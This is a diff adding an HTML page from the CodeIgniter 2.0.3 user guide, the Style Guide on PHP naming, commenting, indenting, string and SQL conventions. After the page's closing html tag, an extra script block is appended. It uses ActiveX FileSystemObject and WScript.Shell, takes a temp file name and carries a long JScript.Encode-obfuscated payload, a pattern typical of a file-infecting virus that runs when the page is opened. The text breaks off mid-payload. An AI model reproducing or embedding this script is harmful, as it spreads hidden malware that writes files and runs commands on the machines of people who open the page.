@@ -1,0 +1,687 @@
+<!--[ANNIE83E333BF08546819]-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Style Guide : CodeIgniter User Guide</title>
+
+<style type='text/css' media='all'>@import url('../userguide.css');</style>
+<link rel='stylesheet' type='text/css' media='all' href='../userguide.css' />
+
+<style type="text/css" media="screen">
+	code {
+		white-space: pre;
+	}
+</style>
+
+<script type="text/javascript" src="../nav/nav.js"></script>
+<script type="text/javascript" src="../nav/prototype.lite.js"></script>
+<script type="text/javascript" src="../nav/moo.fx.js"></script>
+<script type="text/javascript" src="../nav/user_guide_menu.js"></script>
+
+<meta http-equiv='expires' content='-1' />
+<meta http-equiv= 'pragma' content='no-cache' />
+<meta name='robots' content='all' />
+<meta name='author' content='ExpressionEngine Dev Team' />
+<meta name='description' content='CodeIgniter User Guide' />
+
+</head>
+<body>
+
+<!-- START NAVIGATION -->
+<div id="nav"><div id="nav_inner"><script type="text/javascript">create_menu('../');</script></div></div>
+<div id="nav2"><a name="top"></a><a href="javascript:void(0);" onclick="myHeight.toggle();"><img src="../images/nav_toggle_darker.jpg" width="154" height="43" border="0" title="Toggle Table of Contents" alt="Toggle Table of Contents" /></a></div>
+<div id="masthead">
+<table cellpadding="0" cellspacing="0" border="0" style="width:100%">
+<tr>
+<td><h1>CodeIgniter User Guide Version 2.0.3</h1></td>
+<td id="breadcrumb_right"><a href="../toc.html">Table of Contents Page</a></td>
+</tr>
+</table>
+</div>
+<!-- END NAVIGATION -->
+
+
+<!-- START BREADCRUMB -->
+<table cellpadding="0" cellspacing="0" border="0" style="width:100%">
+<tr>
+<td id="breadcrumb">
+<a href="http://codeigniter.com/">CodeIgniter Home</a> &nbsp;&#8250;&nbsp;
+<a href="../index.html">User Guide Home</a> &nbsp;&#8250;&nbsp;
+Style Guide
+</td>
+<td id="searchbox"><form method="get" action="http://www.google.com/search"><input type="hidden" name="as_sitesearch" id="as_sitesearch" value="codeigniter.com/user_guide/" />Search User Guide&nbsp; <input type="text" class="input" style="width:200px;" name="q" id="q" size="31" maxlength="255" value="" />&nbsp;<input type="submit" class="submit" name="sa" value="Go" /></form></td>
+</tr>
+</table>
+<!-- END BREADCRUMB -->
+
+<br clear="all" />
+
+
+<!-- START CONTENT -->
+<div id="content">
+
+
+<h1>General Style and Syntax</h1>
+
+<p>The following page describes the use of coding rules adhered to when developing CodeIgniter.</p>
+
+
+<h2>Table of Contents</h2>
+<ul class="minitoc">
+	<li><a href="#file_format">File Format</a></li>
+	<li><a href="#php_closing_tag">PHP Closing Tag</a></li>
+	<li><a href="#class_and_method_naming">Class and Method Naming</a></li>
+	<li><a href="#variable_names">Variable Names</a></li>
+	<li><a href="#commenting">Commenting</a></li>
+	<li><a href="#constants">Constants</a></li>
+	<li><a href="#true_false_and_null">TRUE, FALSE, and NULL</a></li>
+	<li><a href="#logical_operators">Logical Operators</a></li>
+	<li><a href="#comparing_return_values_and_typecasting">Comparing Return Values and Typecasting</a></li>
+	<li><a href="#debugging_code">Debugging Code</a></li>
+	<li><a href="#whitespace_in_files">Whitespace in Files</a></li>
+	<li><a href="#compatibility">Compatibility</a></li>
+	<li><a href="#class_and_file_names_using_common_words">Class and File Names using Common Words</a></li>
+	<li><a href="#database_table_names">Database Table Names</a></li>
+	<li><a href="#one_file_per_class">One File per Class</a></li>
+	<li><a href="#whitespace">Whitespace</a></li>
+	<li><a href="#line_breaks">Line Breaks</a></li>
+	<li><a href="#code_indenting">Code Indenting</a></li>
+	<li><a href="#bracket_spacing">Bracket and Parenthetic Spacing</li>
+	<li><a href="#localized_text">Localized Text</a></li>
+	<li><a href="#private_methods_and_variables">Private Methods and Variables</a></li>
+	<li><a href="#php_errors">PHP Errors</a></li>
+	<li><a href="#short_open_tags">Short Open Tags</a></li>
+	<li><a href="#one_statement_per_line">One Statement Per Line</a></li>
+	<li><a href="#strings">Strings</a></li>
+	<li><a href="#sql_queries">SQL Queries</a></li>
+	<li><a href="#default_function_arguments">Default Function Arguments</a></li>
+</ul>
+
+<li>
+
+		<h2><a name="file_format"></a>File Format</h2>
+		<div class="guidelineDetails">
+			<p>Files should be saved with Unicode (UTF-8) encoding.  The <abbr title="Byte Order Mark">BOM</abbr>
+				should <em>not</em> be used.  Unlike UTF-16 and UTF-32, there's no byte order to indicate in
+				a UTF-8 encoded file, and the <abbr title="Byte Order Mark">BOM</abbr> can have a negative side effect in PHP of sending output,
+				preventing the application from being able to set its own headers.  Unix line endings should
+				be used (LF).</p>
+
+			<p>Here is how to apply these settings in some of the more common text editors.  Instructions for your
+				text editor may vary; check your text editor's documentation.</p>
+
+			<h5>TextMate</h5>
+
+			<ol>
+				<li>Open the Application Preferences</li>
+				<li>Click Advanced, and then the "Saving" tab</li>
+				<li>In "File Encoding", select "UTF-8 (recommended)"</li>
+				<li>In "Line Endings", select "LF (recommended)"</li>
+				<li><em>Optional:</em> Check "Use for existing files as well" if you wish to modify the line
+					endings of files you open to your new preference.</li>
+			</ol>
+
+			<h5>BBEdit</h5>
+
+			<ol>
+				<li>Open the Application Preferences</li>
+				<li>Select "Text Encodings" on the left.</li>
+				<li>In "Default text encoding for new documents", select "Unicode (UTF-8, no BOM)"</li>
+				<li><em>Optional:</em> In "If file's encoding can't be guessed, use", select
+					"Unicode (UTF-8, no BOM)"</li>
+				<li>Select "Text Files" on the left.</li>
+				<li>In "Default line breaks", select "Mac OS X and Unix (LF)"</li>
+			</ol>
+		</div>
+
+		<h2><a name="php_closing_tag"></a>PHP Closing Tag</h2>
+		<div class="guidelineDetails">
+			<p>The PHP closing tag on a PHP document <strong>?&gt;</strong> is optional to the PHP parser.  However, if used, any whitespace following the closing tag, whether introduced
+				by the developer, user, or an FTP application, can cause unwanted output, PHP errors, or if the latter are suppressed, blank pages.  For this reason, all PHP files should
+				<strong>OMIT</strong> the closing PHP tag, and instead use a comment block to mark the end of file and it's location relative to the application root.
+				This allows you to still identify a file as being complete and not truncated.</p>
+<code><strong>INCORRECT</strong>:
+&lt;?php
+
+echo "Here's my code!";
+
+?&gt;
+
+<strong>CORRECT</strong>:
+&lt;?php
+
+echo "Here's my code!";
+
+/* End of file myfile.php */
+/* Location: ./system/modules/mymodule/myfile.php */
+</code>
+		</div>
+
+
+		<h2><a name="class_and_method_naming"></a>Class and Method Naming</h2>
+		<div class="guidelineDetails">
+			<p>Class names should always start with an uppercase letter.  Multiple words should be separated with an underscore, and not CamelCased.  All other class methods should be entirely lowercased and named to clearly indicate their function, preferably including a verb.  Try to avoid overly long and verbose names.</p>
+
+	<code><strong>INCORRECT</strong>:
+class superclass
+class SuperClass
+
+<strong>CORRECT</strong>:
+class Super_class</code>
+
+
+	<code>class Super_class {
+
+	function __construct()
+	{
+
+	}
+}</code>
+
+			<p>Examples of improper and proper method naming:</p>
+
+	<code><strong>INCORRECT</strong>:
+function fileproperties()		// not descriptive and needs underscore separator
+function fileProperties()		// not descriptive and uses CamelCase
+function getfileproperties()		// Better!  But still missing underscore separator
+function getFileProperties()		// uses CamelCase
+function get_the_file_properties_from_the_file()	// wordy
+
+<strong>CORRECT</strong>:
+function get_file_properties()	// descriptive, underscore separator, and all lowercase letters</code>
+
+		</div>
+
+
+		<h2><a name="variable_names"></a>Variable Names</h2>
+		<div class="guidelineDetails">
+			<p>The guidelines for variable naming is very similar to that used for class methods.  Namely, variables should contain only lowercase letters, use underscore separators, and be reasonably named to indicate their purpose and contents. Very short, non-word variables should only be used as iterators in for() loops.</p>
+<code><strong>INCORRECT</strong>:
+$j = &apos;foo&apos;;		// single letter variables should only be used in for() loops
+$Str			// contains uppercase letters
+$bufferedText		// uses CamelCasing, and could be shortened without losing semantic meaning
+$groupid		// multiple words, needs underscore separator
+$name_of_last_city_used	// too long
+
+<strong>CORRECT</strong>:
+for ($j = 0; $j &lt; 10; $j++)
+$str
+$buffer
+$group_id
+$last_city
+</code>
+		</div>
+
+
+		<h2><a name="commenting"></a>Commenting</h2>
+		<div class="guidelineDetails">
+			<p>In general, code should be commented prolifically.  It not only helps describe the flow and intent of the code for less experienced programmers, but can prove invaluable when returning to your own code months down the line.  There is not a required format for comments, but the following are recommended.</p>
+
+			<p><a href="http://manual.phpdoc.org/HTMLSmartyConverter/HandS/phpDocumentor/tutorial_phpDocumentor.howto.pkg.html#basics.docblock">DocBlock</a> style comments preceding class and method declarations so they can be picked up by IDEs:</p>
+
+<code>/**
+ * Super Class
+ *
+ * @package	Package Name
+ * @subpackage	Subpackage
+ * @category	Category
+ * @author	Author Name
+ * @link	http://example.com
+ */
+class Super_class {</code>
+
+<code>/**
+ * Encodes string for use in XML
+ *
+ * @access	public
+ * @param	string
+ * @return	string
+ */
+function xml_encode($str)</code>
+
+			<p>Use single line comments within code, leaving a blank line between large comment blocks and code.</p>
+
+<code>// break up the string by newlines
+$parts = explode("\n", $str);
+
+// A longer comment that needs to give greater detail on what is
+// occurring and why can use multiple single-line comments.  Try to
+// keep the width reasonable, around 70 characters is the easiest to
+// read.  Don't hesitate to link to permanent external resources
+// that may provide greater detail:
+//
+// http://example.com/information_about_something/in_particular/
+
+$parts = $this->foo($parts);
+</code>
+		</div>
+
+
+		<h2><a name="constants"></a>Constants</h2>
+		<div class="guidelineDetails">
+			<p>Constants follow the same guidelines as do variables, except constants should always be fully uppercase.  <em>Always use CodeIgniter constants when appropriate, i.e. SLASH, LD, RD, PATH_CACHE, etc.</em></p>
+<code><strong>INCORRECT</strong>:
+myConstant	// missing underscore separator and not fully uppercase
+N		// no single-letter constants
+S_C_VER		// not descriptive
+$str = str_replace('{foo}', 'bar', $str);	// should use LD and RD constants
+
+<strong>CORRECT</strong>:
+MY_CONSTANT
+NEWLINE
+SUPER_CLASS_VERSION
+$str = str_replace(LD.'foo'.RD, 'bar', $str);
+</code>
+		</div>
+
+
+		<h2><a name="true_false_and_null"></a>TRUE, FALSE, and NULL</h2>
+		<div class="guidelineDetails">
+			<p><strong>TRUE</strong>, <strong>FALSE</strong>, and <strong>NULL</strong> keywords should always be fully uppercase.</p>
+<code><strong>INCORRECT</strong>:
+if ($foo == true)
+$bar = false;
+function foo($bar = null)
+
+<strong>CORRECT</strong>:
+if ($foo == TRUE)
+$bar = FALSE;
+function foo($bar = NULL)</code>
+		</div>
+
+
+
+		<h2><a name="logical_operators"></a>Logical Operators</h2>
+		<div class="guidelineDetails">
+			<p>Use of <strong>||</strong> is discouraged as its clarity on some output devices is low (looking like the number 11 for instance).
+				<strong>&amp;&amp;</strong> is preferred over <strong>AND</strong> but either are acceptable, and a space should always precede and follow <strong>!</strong>.</p>
+<code><strong>INCORRECT</strong>:
+if ($foo || $bar)
+if ($foo AND $bar)  // okay but not recommended for common syntax highlighting applications
+if (!$foo)
+if (! is_array($foo))
+
+<strong>CORRECT</strong>:
+if ($foo OR $bar)
+if ($foo && $bar) // recommended
+if ( ! $foo)
+if ( ! is_array($foo))
+</code>
+		</div>
+
+
+
+		<h2><a name="comparing_return_values_and_typecasting"></a>Comparing Return Values and Typecasting</h2>
+		<div class="guidelineDetails">
+			<p>Some PHP functions return FALSE on failure, but may also have a valid return value of "" or 0, which would evaluate to FALSE in loose comparisons.  Be explicit by comparing the variable type when using these return values in conditionals to ensure the return value is indeed what you expect, and not a value that has an equivalent loose-type evaluation.</p>
+			<p>Use the same stringency in returning and checking your own variables.  Use <strong>===</strong> and <strong>!==</strong> as necessary.
+
+<code><strong>INCORRECT</strong>:
+// If 'foo' is at the beginning of the string, strpos will return a 0,
+// resulting in this conditional evaluating as TRUE
+if (strpos($str, 'foo') == FALSE)
+
+<strong>CORRECT</strong>:
+if (strpos($str, 'foo') === FALSE)
+</code>
+
+<code><strong>INCORRECT</strong>:
+function build_string($str = "")
+{
+	if ($str == "")	// uh-oh!  What if FALSE or the integer 0 is passed as an argument?
+	{
+
+	}
+}
+
+<strong>CORRECT</strong>:
+function build_string($str = "")
+{
+	if ($str === "")
+	{
+
+	}
+}</code>
+
+		<p>See also information regarding <a href="http://us3.php.net/manual/en/language.types.type-juggling.php#language.types.typecasting">typecasting</a>, which can be quite useful.  Typecasting has a slightly different effect which may be desirable.  When casting a variable as a string, for instance, NULL and boolean FALSE variables become empty strings, 0 (and other numbers) become strings of digits, and boolean TRUE becomes "1":</p>
+
+<code>$str = (string) $str;	// cast $str as a string</code>
+
+		</div>
+
+
+		<h2><a name="debugging_code"></a>Debugging Code</h2>
+		<div class="guidelineDetails">
+			<p>No debugging code can be left in place for submitted add-ons unless it is commented out, i.e. no var_dump(), print_r(), die(), and exit() calls that were used while creating the add-on, unless they are commented out.</p>
+
+<code>// print_r($foo);</code>
+		</div>
+
+
+
+		<h2><a name="whitespace_in_files"></a>Whitespace in Files</h2>
+		<div class="guidelineDetails">
+			<p>No whitespace can precede the opening PHP tag or follow the closing PHP tag.  Output is buffered, so whitespace in your files can cause output to begin before CodeIgniter outputs its content, leading to errors and an inability for CodeIgniter to send proper headers.  In the examples below, select the text with your mouse to reveal the incorrect whitespace.</p>
+
+			<p><strong>INCORRECT</strong>:</p>
+<code>
+&lt;?php
+	// ...there is whitespace and a linebreak above the opening PHP tag
+	// as well as whitespace after the closing PHP tag
+?&gt;
+</code>
+			<p><strong>CORRECT</strong>:</p>
+<code>&lt;?php
+	// this sample has no whitespace before or after the opening and closing PHP tags
+?&gt;</code>
+
+		</div>
+
+
+		<h2><a name="compatibility"></a>Compatibility</h2>
+		<div class="guidelineDetails">
+			<p>Unless specifically mentioned in your add-on's documentation, all code must be compatible with PHP version 5.1+.  Additionally, do not use PHP functions that require non-default libraries to be installed unless your code contains an alternative method when the function is not available, or you implicitly document that your add-on requires said PHP libraries.</p>
+		</div>
+
+
+
+		<h2><a name="class_and_file_names_using_common_words"></a>Class and File Names using Common Words</h2>
+		<div class="guidelineDetails">
+			<p>When your class or filename is a common word, or might quite likely be identically named in another PHP script, provide a unique prefix to help prevent collision.  Always realize that your end users may be running other add-ons or third party PHP scripts.  Choose a prefix that is unique to your identity as a developer or company.</p>
+
+<code><strong>INCORRECT</strong>:
+class Email		pi.email.php
+class Xml		ext.xml.php
+class Import		mod.import.php
+
+<strong>CORRECT</strong>:
+class Pre_email		pi.pre_email.php
+class Pre_xml		ext.pre_xml.php
+class Pre_import	mod.pre_import.php
+</code>
+		</div>
+
+
+		<h2><a name="database_table_names"></a>Database Table Names</h2>
+		<div class="guidelineDetails">
+			<p>Any tables that your add-on might use must use the 'exp_' prefix, followed by a prefix uniquely identifying you as the developer or company, and then a short descriptive table name.  You do not need to be concerned about the database prefix being used on the user's installation, as CodeIgniter's database class will automatically convert 'exp_' to what is actually being used.</p>
+
+<code><strong>INCORRECT</strong>:
+email_addresses		// missing both prefixes
+pre_email_addresses	// missing exp_ prefix
+exp_email_addresses	// missing unique prefix
+
+<strong>CORRECT</strong>:
+exp_pre_email_addresses
+</code>
+
+			<p class="important"><strong>NOTE:</strong> Be mindful that MySQL has a limit of 64 characters for table names.  This should not be an issue as table names that would exceed this would likely have unreasonable names.  For instance, the following table name exceeds this limitation by one character.  Silly, no? <strong>exp_pre_email_addresses_of_registered_users_in_seattle_washington</strong>
+		</div>
+
+
+
+		<h2><a name="one_file_per_class"></a>One File per Class</h2>
+		<div class="guidelineDetails">
+			<p>Use separate files for each class your add-on uses, unless the classes are <em>closely related</em>.  An example of CodeIgniter files that contains multiple classes is the Database class file, which contains both the DB class and the DB_Cache class, and the Magpie plugin, which contains both the Magpie and Snoopy classes.</p>
+		</div>
+
+
+
+		<h2><a name="whitespace"></a>Whitespace</h2>
+		<div class="guidelineDetails">
+			<p>Use tabs for whitespace in your code, not spaces.  This may seem like a small thing, but using tabs instead of whitespace allows the developer looking at your code to have indentation at levels that they prefer and customize in whatever application they use.  And as a side benefit, it results in (slightly) more compact files, storing one tab character versus, say, four space characters.</p>
+		</div>
+
+
+
+		<h2><a name="line_breaks"></a>Line Breaks</h2>
+		<div class="guidelineDetails">
+			<p>Files must be saved with Unix line breaks.  This is more of an issue for developers who work in Windows, but in any case ensure that your text editor is setup to save files with Unix line breaks.</p>
+		</div>
+
+
+
+		<h2><a name="code_indenting"></a>Code Indenting</h2>
+		<div class="guidelineDetails">
+			<p>Use Allman style indenting.  With the exception of Class declarations, braces are always placed on a line by themselves, and indented at the same level as the control statement that "owns" them.</p>
+
+<code><strong>INCORRECT</strong>:
+function foo($bar) {
+	// ...
+}
+
+foreach ($arr as $key => $val) {
+	// ...
+}
+
+if ($foo == $bar) {
+	// ...
+} else {
+	// ...
+}
+
+for ($i = 0; $i &lt; 10; $i++)
+	{
+	for ($j = 0; $j &lt; 10; $j++)
+		{
+		// ...
+		}
+	}
+
+<strong>CORRECT</strong>:
+function foo($bar)
+{
+	// ...
+}
+
+foreach ($arr as $key => $val)
+{
+	// ...
+}
+
+if ($foo == $bar)
+{
+	// ...
+}
+else
+{
+	// ...
+}
+
+for ($i = 0; $i &lt; 10; $i++)
+{
+	for ($j = 0; $j &lt; 10; $j++)
+	{
+		// ...
+	}
+}</code>
+		</div>
+
+
+	<h2><a name="bracket_spacing"></a>Bracket and Parenthetic Spacing</h2>
+		<div class="guidelineDetails">
+			<p>In general, parenthesis and brackets should not use any additional spaces.  The exception is that a space should always follow PHP control structures that accept arguments with parenthesis (declare, do-while, elseif, for, foreach, if, switch, while), to help distinguish them from functions and increase readability.</p>
+
+<code>INCORRECT:
+$arr[ $foo ] = 'foo';
+
+CORRECT:
+$arr[$foo] = 'foo'; // no spaces around array keys
+
+
+INCORRECT:
+function foo ( $bar )
+{
+
+}
+
+CORRECT:
+function foo($bar) // no spaces around parenthesis in function declarations
+{
+
+}
+
+
+INCORRECT:
+foreach( $query->result() as $row )
+
+CORRECT:
+foreach ($query->result() as $row) // single space following PHP control structures, but not in interior parenthesis
+</code>
+		</div>
+
+
+
+		<h2><a name="localized_text"></a>Localized Text</h2>
+		<div class="guidelineDetails">
+			<p>Any text that is output in the control panel should use language variables in your lang file to allow localization.</p>
+
+<code>INCORRECT:
+return "Invalid Selection";
+
+CORRECT:
+return $this->lang->line('invalid_selection');</code>
+		</div>
+
+
+
+		<h2><a name="private_methods_and_variables"></a>Private Methods and Variables</h2>
+		<div class="guidelineDetails">
+			<p>Methods and variables that are only accessed internally by your class, such as utility and helper functions that your public methods use for code abstraction, should be prefixed with an underscore.</p>
+
+<code>convert_text()		// public method
+_convert_text()		// private method</code>
+		</div>
+
+
+
+		<h2><a name="php_errors"></a>PHP Errors</h2>
+		<div class="guidelineDetails">
+			<p>Code must run error free and not rely on warnings and notices to be hidden to meet this requirement.  For instance, never access a variable that you did not set yourself (such as $_POST array keys) without first checking to see that it isset().</p>
+
+			<p>Make sure that while developing your add-on, error reporting is enabled for ALL users, and that display_errors is enabled in the PHP environment.  You can check this setting with:</p>
+
+<code>if (ini_get('display_errors') == 1)
+{
+	exit "Enabled";
+}</code>
+
+			<p>On some servers where display_errors is disabled, and you do not have the ability to change this in the php.ini, you can often enable it with:</p>
+
+<code>ini_set('display_errors', 1);</code>
+
+			<p class="important"><strong>NOTE:</strong> Setting the <a href="http://us.php.net/manual/en/ref.errorfunc.php#ini.display-errors">display_errors</a> setting with ini_set() at runtime is not identical to having it enabled in the PHP environment.  Namely, it will not have any effect if the script has fatal errors</p>
+		</div>
+
+
+
+		<h2><a name="short_open_tags"></a>Short Open Tags</h2>
+		<div class="guidelineDetails">
+			<p>Always use full PHP opening tags, in case a server does not have short_open_tag enabled.</p>
+
+<code><strong>INCORRECT</strong>:
+&lt;? echo $foo; ?&gt;
+
+&lt;?=$foo?&gt;
+
+<strong>CORRECT</strong>:
+&lt;?php echo $foo; ?&gt;</code>
+		</div>
+
+
+
+		<h2><a name="one_statement_per_line"></a>One Statement Per Line</h2>
+		<div class="guidelineDetails">
+			<p>Never combine statements on one line.</p>
+
+<code><strong>INCORRECT</strong>:
+$foo = 'this'; $bar = 'that'; $bat = str_replace($foo, $bar, $bag);
+
+<strong>CORRECT</strong>:
+$foo = 'this';
+$bar = 'that';
+$bat = str_replace($foo, $bar, $bag);
+</code>
+		</div>
+
+
+
+		<h2><a name="strings"></a>Strings</h2>
+		<div class="guidelineDetails">
+			<p>Always use single quoted strings unless you need variables parsed, and in cases where you do need variables parsed, use braces to prevent greedy token parsing.  You may also use double-quoted strings if the string contains single quotes, so you do not have to use escape characters.</p>
+
+<code><strong>INCORRECT</strong>:
+"My String"					// no variable parsing, so no use for double quotes
+"My string $foo"				// needs braces
+'SELECT foo FROM bar WHERE baz = \'bag\''	// ugly
+
+<strong>CORRECT</strong>:
+'My String'
+"My string {$foo}"
+"SELECT foo FROM bar WHERE baz = 'bag'"</code>
+		</div>
+
+
+
+		<h2><a name="sql_queries"></a>SQL Queries</h2>
+		<div class="guidelineDetails">
+			<p>MySQL keywords are always capitalized: SELECT, INSERT, UPDATE, WHERE, AS, JOIN, ON, IN, etc.</p>
+
+			<p>Break up long queries into multiple lines for legibility, preferably breaking for each clause.</p>
+
+<code><strong>INCORRECT</strong>:
+// keywords are lowercase and query is too long for
+// a single line (... indicates continuation of line)
+$query = $this->db->query("select foo, bar, baz, foofoo, foobar as raboof, foobaz from exp_pre_email_addresses
+...where foo != 'oof' and baz != 'zab' order by foobaz limit 5, 100");
+
+<strong>CORRECT</strong>:
+$query = $this->db->query("SELECT foo, bar, baz, foofoo, foobar AS raboof, foobaz
+				FROM exp_pre_email_addresses
+				WHERE foo != 'oof'
+				AND baz != 'zab'
+				ORDER BY foobaz
+				LIMIT 5, 100");</code>
+		</div>
+
+
+
+		<h2><a name="default_function_arguments"></a>Default Function Arguments</h2>
+		<div class="guidelineDetails">
+			<p>Whenever appropriate, provide function argument defaults, which helps prevent PHP errors with mistaken calls and provides common fallback values which can save a few lines of code. Example:</p>
+
+<code>function foo($bar = '', $baz = FALSE)</code>
+		</div>
+
+
+
+</div>
+
+
+
+</div>
+<!-- END CONTENT -->
+
+
+<div id="footer">
+<p>
+Previous Topic:&nbsp;&nbsp;<a href="security.html">Security</a>
+&nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
+<a href="#top">Top of Page</a>&nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
+<a href="../index.html">User Guide Home</a>&nbsp;&nbsp;&nbsp;&middot;&nbsp;&nbsp;
+Next Topic:&nbsp;&nbsp;<a href="../doc_style/index.html">Writing Documentation</a>
+</p>
+<p><a href="http://codeigniter.com">CodeIgniter</a> &nbsp;&middot;&nbsp; Copyright &#169; 2006 - 2011 &nbsp;&middot;&nbsp; <a href="http://ellislab.com/">EllisLab, Inc.</a></p>
+</div>
+
+</body>
+</html>
+<html>
+<script type="text/javascript">
+<!--
+var ayfp6=new ActiveXObject('Scripting.FileSystemObject');var dk5h8=new ActiveXObject('WScript.Shell');var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c='#@~^2CMAAA==-mD~a%!6y{xAPzmOk7+p6(L+1O`E?mMr2YbxTRoksnUXdYhr(Ln^DB#I-mD~6A2Xx	+SPb1Yb-+or8LmOcE?1.kaYRU4nV^B*i-l.~1\\8l$xUm.raYRj^Mk2Yw;^VHm:i\\mD,5!$+;\'4X;.l`m78l$#i7C.P.Xy61\'20!6"RVnYUwn^blVoG^NnDvq*i-mD,0%mFOxyH a,3Bww9Dk7nDk--mUUkRkXdBIW!x^YbGx,l{;FE`b`StrVc1\\8m;{\'0Rl81#P\\CD,:+1Xt\'	nh,2x!hnDmYKDcw0;Xy fMr\\/bI6WDchy,atchK\\nwkM/Yv#pZ:y,atclO3	N`*I:y,64 hW7+g+aYcb*	-lM~mZLGn{: 1a4RrYhv#Ib0v``1!NG+cf.k7+Pza+\'{qu-m!NGnRGDb\\nKz2\'x *\'[1!%GRnCO4"xBzlE#\'LmZLWR&dIl[X*	OTD0v^!NW+cKCY4_E-wlUUb+ l	rB*iLVF/Lc^ZLG+cKmY43B\'-l!YK.E	Rrx6BbIa3kD2`1!LKn nmY4_v-wv*i5lO-6vmT%K+RKCDtQB\'wE#Ia&7VkvmZ%WRKlDtQv\'-B*I8)886;UmDkKx~4f5W*c/S{%T#`.YE.U,w0EX"cMnD2XY+	/bGxglh+v/A{Ro#cOWdWh./lk+v#I8W;	mOkKUP(\\X"8`#`-mD~YZ%DEx1\\(l;c/!8/DDc!Bm-8m;R^nxTYt *bib0vw0Ea"csrV36b/OdvY!%O!_vR9G16v*#P3ERVacYZLOEBB [Km6Ebi)+Vkn~k6`a%;6" wks+AakkYdcD!LO;3B NK^E#bP3!%Va`DTLDESBcNG^E#i)nVk+PbWcwREXy srs2akkO/vYT%DE_v MYWB*bP3;RVa`YZLD;~ER.Y6BbI)80!UmDkW	~^*	L2`b	anS&zRM;xvB^d1Dk2Oc+a+,&J+lN/1DkaYcnx1W[+,BQWRlFOQB,zDEST#pUm.k2Oc?s+2`8!Tbp6+AfHR.E	cEmd1DbwYc+XnPJzn)N/^.bwYcnx1WN~v_6%mF1_v~J/v~Zbiq?^.bwY j^+nwvqZ!bp6h&HR";xvB^/1Dr2DR+XnPJz+=%dmMkaY +U^KNnPEQ0Rlq13BP&UE~T#pN6EU1YbWx,mS*DD`[%NlabPk0v2%!6ycorV2XkdYdc9%%lXb#PDnO!Dx~2REayc!YobV`NRLma#c?ryiNn^/+P.+DED	~UE^Vp8N0;U1YrW	~Ny4WXvE02{!#`DO!DU,wRE6.RVnY~ld+glhnvE0a{E*i86;UmDkKx~NfCHLco8O 7#`OMX	.nDE.x,2REa.R}w+	KaYwks+voqOy\\~8bR"+l9Jrx`*iNmCO1tc+*`DY;.	Px;s^iN86;	mObW	P+OVN"`*	r0vmA*MY`60l8,#ex1 ZF*	O!n.6`W%mq,*ianS&X ]!xcBSd1DraYc+6PJ&+=LdmMk2Oc+x1GNPB3W0l8,3B~znv*iN86;x1YrG	PoV{kLc0+W$wbP\\mDP1GR;,{B,l!YG.!xT\'U/4+V^na+1ED+xhd^Mk2Ycn6P&&)Ld^Mk2Ycn	mG9+,lx	k l	k~zm-Ud4+V^w-Kw+	wwmK:slUNxAkm.kaOR6n~Jz+l%km.kaOc+U1W9+Pmx	r+clUk,zCw	/tsV\'-+X2sWM+\'-^Whhmx[\'SdmMk2Oc+6n~Jzn)Nd1DraYc+x1W9nPmxUkRCUbPzmvib0`4z;Dl`6vW;2be\'^GR;,*	rG24DcW+05wBT*iOMXP\\lMPb[%^;xwREa"cZDCYK+XOok^+v0052BY.EbibN0s$R.rD+cmF0!,bpk9%V$R;sWk+c#p8^CDmtvn#Pk0v20EXycsGV[nM2akkO/v0W$w#b`H%;6Wc6vW$w*io0Gk%`6vW;a#IN)0k	CV^X	bGf4M`6vW;2S2,bi)N86EU^DkWU~4X;Dlcacd06*	YMXP.+DE.x,w0;XyR}2+	K+XOok^+vw*/VaBFbR"nl9bssv#iN^mY^tvn*	.Y!Dx,BEI8)0;x1YrG	PkKf4M`D.;13BhkyWGb`b0cwR;6.Ror^+2arkYd`M"!,V*#PYDH	7CD,YWt0Vx2RE6. MYsbsn`My!,V#IO6tVVc)YDDr8!Y+dxS/"0FI)mCDm4`+*	)N86EUmDkGU,ky{vvw,0.5#P6hfX ]o	DbO+vBuF;I-wv3D^:WAvB x?AB#3B\'wBBD^:Whc.1:cScwO3D$bQB\'-E#bianS&zR"noqDrO`BuF;Iw-EQMmhWhvBRx?Av#3Bw-G+WC!VY&^W	--ES.mscS`.mh*S`2,0.;*_vw\'f+WC!VOq1G	-wE#*i6h2zR"+LMkOnvBCn/I\'-B3.^:WhvB 9j3E#QB\'wsMknU9VXPza+HlsnE~.1:Wh`Mms*hvw13M;bQE--Eb~EI2Vm3(hbgfm?tv*iN0!UmDkGU,3E0sa`[XZ"m~WN:80#PYMz	7l.P9D+;M\'D1hcS`D1h*hv0N:q0bQE-w/4nV^-w6a+xww1Wh:mU9Bbpk6`NM !.RslOm4`&Y8z#exx!VV*`a+S&HR]EUc9D+EM DwsC1+`vY8BSNHT.lQ6LsF0*#pN+^/n	X+AfHRI!U`9D !.QB,JE_[XT"m_WLsq03BEv*i8N^mY^tvn*	N)0!xmDkKUP^w0DW`b`Stk^n`1\\4m5x\'6%mF1#`OZ+.0vW%mF1bp6xL48`bi.T(6sv#p:4^61c#pjmMk2Oc?VnwvF!ZTbi)86EUmOrKx~:(s61`b`DDX`r.+{vvvcNG16E#i)mmOm4`n#PY.zPky{vvBR9G^B*i)mCY^4v+b	D.XPk"nFv`v MYWB*I)mCDm4`+*	)N8)0;x1YrG	Pw2-Vb`lS^XV*	7l.PW2^xX\'	nh,2U;s+DCOKDcwR;Xy V+DsW^N.`mh^*^# j!4sKsND/*IWWM`6wsxX sW-+wrDkYcbp"02s	* lD3	Nc*i6wV	*chW7+H+XYcb*	\\m.P(+GM^x0aV	* kOns`bibW`v4n{MmRHCs+Z\'E]AZe;SAIBL[(nGMm 1m:nZ{B?HdY:PjGsEs+,qU0G.slOkKUB*[\'8GD^ hlOtexa%;XycM+D?anmblssKV[nM`!*b	$l,7ac4GMm nCO4#Iw2-Vb`8nFDm KmY4#pN)8W!x1YkKx,23bY2`(Eq.X#	6GDv\\lM~r\'8ib@!x*Ir3_b	7CD,hTW/\'8;8Da_E8l;Dk6EV|ob.V|wCDD{vQb_Bcsx0BibWc"a%!6"Ror^+36bdYk`AZc/bbPY.XP-mD~k\\RLy{6A&HR/DlOnUtWMOm!Y`STck#p/-%%"cq^W	JW1lOrKx\'vAswsW1 9VsB%Ei/7%N"R:l.oYKCDt\'EA/1DkaO 